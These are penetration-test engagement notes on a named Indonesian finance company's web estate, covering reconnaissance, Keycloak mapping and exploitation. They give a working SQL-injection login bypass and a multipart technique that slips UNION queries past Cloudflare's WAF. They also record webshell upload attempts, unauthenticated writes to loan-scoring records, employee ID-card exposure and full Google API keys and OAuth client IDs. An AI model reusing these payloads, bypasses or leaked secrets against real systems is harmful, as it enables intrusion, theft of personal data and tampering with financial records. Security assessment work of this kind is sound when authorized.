# BFI Finance Engagement Notes (2026-05-29)

## Target: bfi.co.id (Internal Pentest)

### Infrastructure
- **Hosting:** GCP (GKE/Kubernetes behind Envoy), fronted by Cloudflare
- **CMS:** Pimcore (PHP 8.1.31) with debug mode ON
- **Auth:** 3 Keycloak instances (sso.bfi.co.id/master, auth.bfi.co.id/google-workspace, microservices.prod.bravo.bfi.co.id/keycloak/bravo+master)
- **Microservices:** Spring Boot behind Envoy gateway, gRPC for some services
- **Static apps:** 22+ React SPAs on Google Cloud Storage
- **Email:** Google Workspace + Mailgun + Salesforce

### Key Findings (7)
1. **PTEST-001 (High):** credentials.csv with 42 users, MD5 hashes, PII (KTP, phone, email). 15 users with password "123" including Head-level roles.
2. **PTEST-002 (Medium):** /master/v1/address/* accessible without auth. /master/v1/branch,employee,customer return 500 (CORS bug, not auth).
3. **PTEST-003 (Low):** JS bundles leak Keycloak config, API keys, client IDs, private GitHub repo name. Server headers leak PHP version, Pimcore, debug mode.
4. **PTEST-004 (Medium):** Keycloak admin console at /keycloak/admin/bravo/console/ publicly accessible (200).
5. **PTEST-005 (Low):** 302 redirects leak internal K8s service names (prod-ms-{service}.prod.svc.cluster.local). 10 services mapped.
6. **PTEST-006 (Medium):** CORS misconfiguration on microservices gateway — reflects arbitrary Origin with credentials:true.

### Keycloak Architecture
| Instance | Realm | Client IDs | Notes |
|----------|-------|-----------|-------|
| sso.bfi.co.id | master | admin-cli | Admin console 403 (IP-restricted) |
| auth.bfi.co.id | google-workspace | onboarding-platform-apps, bpm-identity-public, direct-marketing | Password grant disabled, uses Google SSO |
| microservices.prod.bravo.bfi.co.id/keycloak | bravo, master | unsecured-internal-login | Admin console accessible (200), nonce disabled |

### Internal Services Mapped (via 302 leaks)
```
prod-ms-edoc.prod.svc.cluster.local
prod-ms-document.prod.svc.cluster.local
prod-ms-payment.prod.svc.cluster.local
prod-ms-onboarding.prod.svc.cluster.local
prod-ms-master.prod.svc.cluster.local
prod-ms-customer.prod.svc.cluster.local
prod-ms-branch.prod.svc.cluster.local
prod-ms-product.prod.svc.cluster.local
prod-ms-insurance.prod.svc.cluster.local
prod-ms-agreement.prod.svc.cluster.local
```

### PTEST-007 (Critical): SQLi Auth Bypass + Mass PII on e-pmo2.bfi.co.id
- **Target:** `e-pmo2.bfi.co.id/boarding/build_sys/login.php` (also /room, /dfr, /kboard share same codebase)
- **Root cause:** Direct string concatenation in SQL query, no prepared statements
- **Bypass:** `user_id=admin'-- -&user_pass=x` → 302 to `/boarding/Production/index.php` + PHPSESSID
- **Query structure:** `WHERE user_id='$input' AND user_pass='$md5_pass' AND user_status='Aktif'`
- **Password handling:** MD5 hashed client-side before POST
- **WAF behavior:** Cloudflare blocks UNION/OR keywords but allows comment-based bypass (`'-- -`)
- **Impact:** Full admin access → user.php exposes 369 employees: NIK, full names, KTP (16-digit national ID × 362), work+personal emails, branches, roles
- **Path disclosure:** `/var/www/html/boarding/build_sys/login.php:11`
- **Apps found:** /boarding (BOARDING), /room (ROOM), /dfr (DF Report), /kboard (K-Board) — all PHP login forms posting to `build_sys/login.php`
- **Discovery method:** User knew the paths (boarding, room, dfr, kboard) — standard wordlists (DirBuster small) did NOT contain them. ffuf with size filtering and nuclei both returned 0 findings on the root.
- **Key lesson:** The Apache2 default page was a red herring. 4 live apps existed behind custom paths that no standard wordlist covers. Never declare a host "dead" without exhausting custom/contextual path discovery.

### What Didn't Work
- Credential testing against all 3 Keycloak realms (200+ combos) — all failed
- JWT none algorithm attack — rejected
- Path traversal (..;) — gateway normalizes
- Actuator bypass — all 403 at gateway
- SSRF on Pimcore/Keycloak — admin paths blocked
- Nuclei scan — 0 findings (Cloudflare + gateway well-configured)
- Host header injection, CRLF — blocked
- Implicit flow on Keycloak — disabled

### Lessons
- Pattern-based subdomain brute-force is essential — `e-pmo2.bfi.co.id` was missed by CT/passive enum but existed
- GCS-hosted SPAs are goldmines for JS bundle analysis (no server-side filtering of secrets)
- 302 redirects to internal services = free K8s service enumeration
- "Unsecured" in naming (unsecured-v2, unsecured-internal-login) doesn't mean actually unsecured — still requires JWT
- **Accidental security control pattern:** Double Vary header (gateway + Spring @CrossOrigin both add `Vary: Origin`) causes HTTP 500 on endpoints that actually have NO auth. Only `/master/v1/general` (missing @CrossOrigin) is accessible — proving entire service is unauthenticated. When devs fix CORS bug, all data exposed. Differential: 500 = CORS conflict (no auth), 401 = real auth enforcement.
- **Django LMS (mbadmin.bfi.co.id):** Savoir platform v1.8.7.Post1212.Dev1. Registration triggers ORM error leaking `nems.users.models.User`. django-hijack installed (`/hijack/acquire/` returns 400, `/id/hijack/release/` returns 403). Version in page footer. `/static/hijack/hijack-styles.css` in source = hijack indicator.
- **Service-wide auth assessment via response code differential:** Compare responses across endpoints on same service prefix. If some return 500 (app error) and others return 401 (auth denied), the 500 endpoints likely lack auth — the error is from business logic, not access control. BFI: `/master/v1/*` all return 500 (CORS), `/payment/v1/*` all return 401 (proper auth). Master is the outlier.
- **PATCH on financial config records:** Proved write access to LOAN_REJECT_CANCEL_SCORING (id=4605), UNDERWRITING_NOT_PASSED (id=5548 with role-based approval config). 821 SLIK credit bureau records + 85 scoring configs modifiable without auth.
- Cloudflare + Envoy gateway combo is very effective at blocking automated attacks
- When all Keycloak realms reject credentials, the leaked passwords are for a different internal system
- **Apache2 default page ≠ dead host** — standard wordlists (DirBuster, SecLists common) returned 0 results on e-pmo2, but custom internal app paths (/boarding, /room, /dfr, /kboard) existed. Always ask for context-specific paths or derive them from org naming patterns.
- **Cloudflare WAF has blind spots** — blocks UNION/OR/SELECT keywords but allows comment-based SQLi bypass (`'-- -`). Test multiple injection styles when one is blocked.
- **PHP apps behind default pages are often legacy/unmaintained** — no prepared statements, MD5 password hashing, full error disclosure, path disclosure in stack traces. High-value targets.

### Post-Exploitation Attempts (RCE from SQLi — FAILED)

**Goal:** Escalate SQLi auth bypass to RCE on e-pmo2.bfi.co.id

**Vectors attempted:**
1. **SQLi → file write (INTO OUTFILE)** — Cloudflare WAF blocks all SQL keywords (UNION, SELECT, LOAD_FILE, INTO OUTFILE)
2. **SQLi → stacked queries (SLEEP/BENCHMARK)** — No time delay observed; query structure prevents execution after WHERE clause
3. **SQLi → error-based extraction (extractvalue/updatexml)** — WAF blocks
4. **sqlmap with tamper scripts (between, randomcase, space2comment)** — WAF blocks all; sqlmap reports "not injectable" due to 403 responses
5. **File upload → webshell** — travel_ticket_crud_code_edit.php accepts file uploads to `fileupload/fileupload_boarding/` with pattern `{project}_{approval_by}_{user_id}_{timestamp}.{ext}`
   - Server-side extension validation: only .png/.pdf/.jpg/.jpeg accepted
   - Double extension stripped: `shell.php.png` → saved as `.png`
   - Cloudflare WAF inspects file CONTENT: blocks any `<?`, `<script`, PHP tags regardless of extension
   - .phtml extension rejected server-side
   - Null byte in filename blocked by WAF
   - Base64-encoded PHP payload (no tags) uploads fine but won't execute as .png
6. **.user.ini upload** — WAF blocks `auto_prepend_file` content
7. **.htaccess upload via CSV import** — accepted by assignment_import.php but goes into DB as data, not saved as file
8. **LFI via page params** — no include/require with user input found
9. **Path traversal in upload filename** — project name used in filename but extension still forced

**Why RCE is blocked:**
- Cloudflare WAF content inspection on uploads (blocks PHP/script tags in body)
- Server-side extension whitelist (png/pdf/jpg/jpeg only)
- Server renames files (no control over final extension)
- No LFI/include vector to chain with uploaded files
- SQLi limited to auth bypass only (WAF blocks all data extraction keywords)
- nginx/1.22.1 + Apache2 backend — no known config-based execution bypass

**What IS achievable without RCE:**
- Full auth bypass on /boarding (admin access)
- Read all 365 employee records (NIK, KTP, names, emails)
- Modify travel tickets, assignments, hotel bookings
- Upload files (safe extensions only)
- Potential account takeover via password change (requires old password though)

**Conclusion:** RCE not achievable externally. Would require: internal network access (bypass Cloudflare), a different vuln class (deserialization, SSTI), or compromise of another service sharing the server.

### Multipart WAF Bypass — Advanced SQLi Exploitation

**Discovery:** Switching POST body from `application/x-www-form-urlencoded` (`curl -d`) to `multipart/form-data` (`curl -F`) bypasses Cloudflare's SQL keyword detection.

**What passes via multipart but is blocked via urlencoded:**
- `UNION SELECT 1,2,...,15` → 302 (success)
- `UNION ALL SELECT ...` → 302
- `ORDER BY <n>` → 302 (column count enumeration)
- `ORDER BY <column_name>` → 302 if exists, 200+error if not
- `FROM <table_name>` → error leaks DB name if table doesn't exist
- `UNION SELECT * FROM user LIMIT x,1` → valid session with reflected data
- `user()`, `current_user()`, `session_user()` in UNION → 302 (executes)
- `information_schema.tables` / `information_schema.columns` → 302 (accessible)

**Still blocked in multipart:**
- `AND`, `OR`, `XOR` boolean operators
- `CONCAT()` function
- `WHERE` clause inside UNION
- `@@version` in UNION context (inconsistent)

**Exploitation results via multipart:**
- **Column count:** 15 (ORDER BY 15 = 302, ORDER BY 16 = error)
- **Database name:** `boarding` (from error: "Table 'boarding.users' doesn't exist")
- **Table name:** `user` (not `users` — confirmed via FROM clause)
- **Confirmed columns (12):** user_id, user_pass, user_name, user_status, user_role, user_jabatan, user_jg, user_nohp, user_tgllahir, user_noktp, user_emailbfi, user_emailpersonal
- **Unknown columns (3):** positions 13-15, one maps to `$user_branch` in login.php line 33
- **Session reflection:** `SELECT * FROM user LIMIT x,1` creates valid session; user_id reflected in password form, user_name reflected in nav `<span>`
- **Column existence oracle:** `ORDER BY <col_name>` → 302 = exists, 200 + "Unknown column" error = doesn't exist

**DB Privilege Assessment:**
| Privilege | Status | Evidence |
|-----------|--------|----------|
| SELECT | ✅ | UNION SELECT works |
| INSERT/UPDATE | ✅ | File upload inserts data, travel tickets modifiable |
| FILE (LOAD_FILE/OUTFILE) | ❌ | "Access denied; you need (at least one of) the FILE privilege(s)" |
| information_schema | ✅ | UNION SELECT from information_schema.tables returns 302 |
| SUPER | ❌ | No evidence of elevated privileges |
| Functions (user(), version()) | ✅ | Execute via UNION but can't reflect output due to session column mapping |

**Blocker for full data extraction:** The 3 unknown columns (positions 13-15) prevent creating a fully working session when columns are reordered. `SELECT *` works but puts data in fixed positions. Swapping `user_pass` into `user_id` position breaks the session because `$user_branch` (derived from one of cols 13-15) becomes undefined. Without `CONCAT()` (blocked) or `WHERE` (blocked), can't put hash into a reflected position.

**Potential next steps (if returning to this target):**
1. Find the 3 unknown column names (try more naming patterns, or use information_schema with LIMIT/OFFSET iteration)
2. Use `information_schema.columns` with LIMIT to enumerate ALL column names for the `user` table
3. Once all 15 columns known, craft UNION that puts user_pass in user_id position with valid session
4. Alternative: boolean-based extraction using ORDER BY (sort by user_pass, observe which user_id comes first at each LIMIT offset — leaks hash ordering)

### File Upload Form Details (travel_ticket)

```
POST /boarding/Production/travel_ticket_crud_code_edit.php
Content-Type: multipart/form-data

Required fields:
- travel_ticket_user_id=Admin
- travel_ticket_return_utama_id=636
- travel_ticket_return_update_id=1891
- travel_ticket_return_approval_doc=<existing_filename>
- travel_ticket_return_approval_by=<NIK>
- travel_ticket_return_approval_by_jobtitle=<text>
- travel_ticket_return_nama_project=<project_name>  ← becomes filename prefix
- travel_ticket_return_utama_created_date=<datetime>
- travel_ticket_return_user_id=<NIK>
- travel_ticket_return_update_nik=<NIK>
- travel_ticket_return_update_job_grade=<int>
- travel_ticket_return_update_handphone=<phone>
- travel_ticket_return_update_departure_date=<date>
- travel_ticket_return_update_departure_time=<Pagi/Siang/Sore/Malam>
- travel_ticket_return_update_transportasi=<Pesawat/Kereta Api>
- travel_ticket_return_update_stasiun_bandara_departure=<code>
- travel_ticket_return_update_stasiun_bandara_arrival=<code>
- travel_ticket_return_update_rekomendasi_tiket=<text>
- travel_ticket_return_update_note=<text>
- travel_ticket_return_update_created_date=<datetime>  ← MUST be valid datetime, not empty
- travel_ticket_approval_doc=@file  ← the upload
- travel_ticket_approval_by=<NIK>
- travel_ticket_nama_project=<project_name>
- inputact=Save

File saved to: fileupload/fileupload_boarding/{project}_{approval_by}_{user_id}_{timestamp}.{ext}
Accessible at: https://e-pmo2.bfi.co.id/boarding/Production/fileupload/fileupload_boarding/<filename>
```

### e-pmo2 Full App Inventory (9 apps, not 4)

**Discovered 2026-05-30:** e-pmo2.bfi.co.id hosts 9 PHP apps, not the 4 originally found:

| App | Path | SQLi Bypass | Auth Method | Data Exposed |
|-----|------|-------------|-------------|--------------|
| RAPI | /rapi/ | ✅ (R3-F1) | raw mysqli->query() | 21 databases, full DB takeover |
| BOARDING | /boarding/ | ✅ (NEW) | raw mysqli (crashes on close) | 3,097 employees: NIK, KTP, names, roles, branches |
| CORE | /core/ | ✅ (NEW) | same pattern | Empty dashboard (needs further enum) |
| PROJO | /projo/ | ✅ (NEW) | same pattern | HR assessment: interviews, scores, OJT, mentor feedback, FGD |
| ROOM | /room/ | ❌ | mysqli_real_escape_string | "User belum terdaftar" on injection |
| DFR | /dfr/ | ❌ | mysqli_real_escape_string | "User belum terdaftar" on injection |
| KBOARD | /kboard/ | ❌ | mysqli_real_escape_string | "User belum terdaftar" on injection |
| VMS | /vms/ | N/A | DB connection fails | Path disclosure: /var/www/html/vms/db_config_sys/connection.php:9 |
| ABSEN | /absen/ | ⚠️ (500) | different form (build/login.php, username field) | Needs different payload testing |

**Key pattern:** Apps using raw `mysqli->query()` (boarding, core, projo, rapi) are all vulnerable to `admin'-- -` bypass. Apps using `mysqli_real_escape_string()` (room, dfr, kboard) reject the injection but leak deprecation warnings + code paths.

**Bypass payload (all vulnerable apps):**
```
POST /boarding/build_sys/login.php
user_id=admin'-- -&user_pass=x
→ 302 to Production/index.php + PHPSESSID (authenticated)
```

**Dashboard stats from /boarding:** 3,097 total employees (835 active, 2,262 inactive), 4,820 boarding records (4,673 closed, 147 open)

### Phase 3 Gap Closure (2026-05-30)

**Problem:** Original Phase 3 only scanned 19/186 live subdomains (10% coverage).

**Resolution:** Batch-probed all 170 remaining targets:
- 114 returned 200, 17 returned 404, 15 returned 403, 7 returned 301
- Nuclei (critical+high+medium) on 145 accessible targets: 0 findings
- Manual testing found the 5 new findings above

**Additional intel from gap closure:**
- Google API keys in `unsecuredv2-internal.sit.bravo.bfi.co.id` JS bundle: `AIzaSyAm24EzJWXJM_-EKIyiEz5r-6uh7eU3QtI`, `AIzaSyCzr7NwJURji1grFCVP7pmmg3gEbgC48Ek`
- Keycloak config confirmed: CLIENT_ID="unsecured-internal-login", REALM="Bravo", URL=microservices.sit.bravo.bfi.co.id/keycloak
- operation.prod.bravo uses clientId="los-operation", realm="google-workspace"
- GCS buckets (digital-bucket, master-assets) properly locked (403 AccessDenied)
- Airflow (prod/sit/uat) properly locked (403)
- bravo-notification mock: catch-all route returns same JSON for all /actuator/* paths (not real actuator)
- k6-reporter.uat redirects to GCS bucket (k6-reporter-uat-bravo-bfi-co-id) — listing denied
- All previous 30 findings re-verified: 0 fixed

### Phase 4 Redo: Full Attack Surface Mapping (2026-05-30)

**Problem:** Original Phase 4 only inventoried 22/186 live subdomains (12% coverage).

**Resolution:** Expanded to 135 individually mapped assets across all tiers.

**New Keycloak server discovered:** `sso.nonprod.bravo.bfi.co.id`
- Found via JS bundle analysis of `backoffice-web-ui.uat.bravo.bfi.co.id`
- Realm: `google-workspace` (only realm; bravo/bpm/master all 404)
- `admin-cli` accepts password grant (returns "Invalid user credentials" not "client not allowed")
- CORS reflects arbitrary origin with credentials (same as prod R1-F9)
- No rate limiting on token endpoint
- Other clients: `direct-marketing` (no password grant), `bpm-identity-public` (invalid client)

**New Keycloak clients discovered:**
| App | Realm | Client ID | Auth Server |
|-----|-------|-----------|-------------|
| asisten.bfi.co.id | google-workspace + bpm | bpm-identity-public, onboarding-platform-apps | auth.bfi.co.id |
| operation.prod.bravo | google-workspace | los-operation | auth.bfi.co.id |
| operation-syariah | Bravo | bpm-identity-public | (embedded) |
| surveyor-syariah | Bravo | bpm-identity-public | (embedded) |
| backoffice-web-ui.uat | google-workspace | direct-marketing | sso.nonprod.bravo.bfi.co.id |
| unsecuredv2-internal.uat | bravo | unsecured-internal-login | microservices.uat.bravo.bfi.co.id/keycloak |

**Hosts without Cloudflare WAF (direct GCS UploadServer):**
- merchantpartner.bfi.co.id, multigunamotor.bfi.co.id (PROD, no WAF!)
- All *.uat.bravo.bfi.co.id, *.sit.bravo.bfi.co.id, *.dev.bravo.bfi.co.id

**Google IAP OAuth client IDs leaked:**
- sealed-secrets-web.core-system.prod: `931901246782-qhflek0dgc1m6eu6q21lorpnrjk915f9`
- sealed-secrets-web.core-system.sit: `897763781483-ie9as21085vtseip41n0sv1krcpcs5rt`
- sealed-secrets-web.dev.bravo: `749148242936-eik8hsd2p76lh75vbtq5ojm4fc6r2o51`
- go-example.dev.bravo: `42915549641-qiggcbpnde7evtg9vkhg1qvjoe1vb011`

**ArangoDB API reachable:** `/_db/_system/_api/version` returns 401 (not 403) on prod/sit/uat — HTTP API is live, just needs credentials.

**New entry points for Phase 5-6:**
- `syariah.bfi.co.id/login.php` — legacy PHP, SQLi candidate (same pattern as e-pmo2)
- `multigunamotor.bfi.co.id` — public loan form, no WAF
- `e-webform.bfi.co.id` — AngularJS + Form.io dynamic forms
- `l.uat/sit.bravo.bfi.co.id` — redirect service, open redirect candidate

**Technique: JS bundle auth config extraction**
- All React SPAs on GCS serve unminified-enough JS bundles
- Search for: `KEYCLOAK_URL`, `KEYCLOAK_REALM`, `KEYCLOAK_CLIENT_ID`, `clientId:`, `realm:`, `authServerUrl`
- Pattern: `curl -sk "https://$host/" | grep -oE 'src="[^"]*\.js"' | grep index` → download → grep for config
- Works because GCS UploadServer has no server-side filtering

### mbadmin.bfi.co.id — Django LMS (Savoir Platform)

**Discovery (2026-05-30 Round 4):** Custom Django-based LMS at `mbadmin.bfi.co.id`.

**Platform:** Savoir LMS, Version 1.8.7.Post1212.Dev1, Django backend with allauth.

**Findings:**
1. **Django ORM Error Disclosure (R4-F3, Low-Medium):**
   - Registration at `/id/accounts/signup/` triggers unhandled exception
   - Error: `"Field 'id' expected a number but got <class 'nems.users.models.User'>."`
   - Leaks internal model path (`nems.users.models.User`) and version string
   - Reproducible with any valid signup payload — server-side bug, not input-dependent
   - Registration is completely broken (DoS on user onboarding)

2. **Django-Hijack User Impersonation (R4-F4, Medium):**
   - `/hijack/acquire/` → HTTP 302 (redirects to login, requires auth)
   - `/hijack/release/` → HTTP 403 (not 404 — endpoint exists and is active)
   - `/id/hijack/acquire/` → HTTP 400 (accepts `user_pk` parameter)
   - `/id/hijack/release/` → HTTP 403
   - django-hijack allows admin users to impersonate any user
   - If any admin account is compromised → full lateral movement to all users
   - CSS loaded: `/static/hijack/hijack-styles.css` (confirms active installation)

**Accessible paths (unauthenticated):**
- `/id/accounts/login/` — login form (200)
- `/id/accounts/signup/` — broken registration (200, ORM error)
- `/id/accounts/password/reset/` — password reset (200, no user enumeration)
- `/id/dashboard/overview/` — redirects to login (302)
- `/id/dashboard/activity/` — redirects to login (302)
- `/id/dashboard/assignment/` — redirects to login (302)

**What didn't work:**
- Registration (server-side ORM bug prevents account creation)
- Credential stuffing from breach CSV (passwords changed on Keycloak)
- Hijack without auth (redirects to login)
- Django debug mode (not enabled — custom 404 page)
- Admin panel at `/admin/` or `/id/admin/` (404)

**Sidebar menu reveals internal structure:**
- Dashboard: Ikhtisar (Overview), Aktifitas (Activity), Tugas (Assignment)
- Reports section (commented out in HTML)
- Learnings, Audience, Users sections
- Language: Indonesian (id) + English (en)

### Round 4 Verification Results (2026-05-30)

**Still exploitable (unfixed):**
- R1-F1/R4-F1: Unauth write `/master/v1/general` → created record #5672
- R1-F9: CORS on both `microservices.prod.bravo` AND `auth.bfi.co.id`
  - Reflects `https://evil.com` with `credentials: true`
  - Token endpoint allows cross-origin POST (preflight returns allow-methods: POST, OPTIONS)
  - `/userinfo`, `/.well-known/openid-configuration`, `/realms/bravo/`, `/protocol/openid-connect/certs` all reflect
  - PoC: `cors-keycloak-poc.html` in exploit/ dir

**Confirmed fixed:**
- bravo-bpm.mock (heapdump R2-F1): host unreachable (removed)
- e-pmo2 SQLi (R3-F1): Cloudflare WAF deployed

**Credential stuffing results:**
- 15 users with MD5(123) in breach CSV
- Remaining 7 unique hashes NOT in rockyou-50 or top-10k wordlists (likely custom passwords)
- All tested against Keycloak (google-workspace + bravo realms): "Invalid user credentials"
- Tested both `user@bfi.co.id` and `user` formats — neither works
- Conclusion: Keycloak uses different credential store than the breached app

**Nonprod vs Prod security inversion:**
- `microservices.dev.nonprod.bfi.co.id/master/v1/general` → 401 (properly secured)
- `microservices.prod.bravo.bfi.co.id/master/v1/general` → 200 + 905KB data (NO AUTH)
- Prod is less secure than nonprod for this endpoint

### Phase Status
- Phase 1 (Recon): ✅ Complete
- Phase 2 (Enumeration): ✅ Complete
- Phase 3 (Vuln Scanning): ✅ Complete (gap closed 2026-05-30, all 186 live hosts covered)
- Phase 4 (Attack Surface): ✅ Complete (redo 2026-05-30, 135 assets mapped, was 22)
- Phase 5 (Exploitation): ✅ Complete — SQLi auth bypass on 4 apps, data extracted, RCE attempted but blocked
- Phase 7 (Post-Exploitation): ❌ Pending — demonstrate deeper impact from SQLi
- Phase 8 (Reporting): ❌ Pending — 38+ total findings (30 original + 5 gap closure + 4 Phase 4 redo + 5 Round 4 new)

### R4-F5: Entire Master Service Unauthenticated (Masked by CORS Bug)

**Discovery technique:** Error-type differentiation proves missing auth.

**Evidence chain:**
1. `/master/v1/general` (no `@CrossOrigin`) → returns 905KB data, no auth
2. `/master/v1/employee`, `/branch`, `/product`, `/customer`, `/role`, `/permission`, `/config`, `/user`, `/lookup`, `/setting`, `/category`, `/status` → all return 500 "Duplicate key Vary" (NOT 401/403)
3. Raw TCP response shows: JSESSIONID set, no WWW-Authenticate, `x-envoy-upstream-service-time` present (request reached backend)
4. Comparison: `/payment/v1/`, `/insurance/v1/`, `/customer/v1/`, `/bpm/v1/` all return proper 401

**Data at risk (currently accessible via /general):**
- 4199 records total
- 821 records with SLIK codes (credit bureau integration)
- 85 scoring/approval config records
- Record 4605 (`LOAN_REJECT_CANCEL_SCORING`) — modified and reverted as proof
- Record 5548 (`UNDERWRITING_NOT_PASSED`) — contains role-based rejection authority list

**Data at risk (after CORS fix exposes other endpoints):**
- Employee PII (names, KTP, emails, phone numbers)
- Customer records
- Branch configurations
- Role/permission mappings
- Product configurations

**Key insight:** The CORS double-header conflict is an ACCIDENTAL security control. When devs fix it (routine task), all data becomes exposed. Frame as "ticking time bomb" in report.

### Services Discovered (Round 4 Gateway Enumeration)

| Service | Path | Auth | Notes |
|---------|------|------|-------|
| master | /master/v1/* | ❌ NONE | Only /general accessible (CORS bug masks others) |
| bpm | /bpm/v1/* | ✅ 401 | Camunda-based (engine-rest, cockpit, tasklist paths exist) |
| document | /document/v1/* | ✅ 401 | |
| notification | /notification/v1/* | ✅ Basic auth | Different auth scheme (gRPC-style: "invalid basic auth") |
| customer | /customer/v1/* | ✅ 401 | |
| payment | /payment/v1/* | ✅ 401 | Webhook/callback also requires auth |
| insurance | /insurance/v1/* | ✅ 401 | |
| approval | /approval/v1/* | 503 | Service down |
| report | /report/v1/* | 503 | Service down |
| audit | /audit/v1/* | 503 | Service down |
| integration | /integration/v1/* | 503 | Service down |

**Conclusion:** Master service is the ONLY one without auth — all others properly enforce 401. This proves the team knows how to implement auth; they just didn't on master.
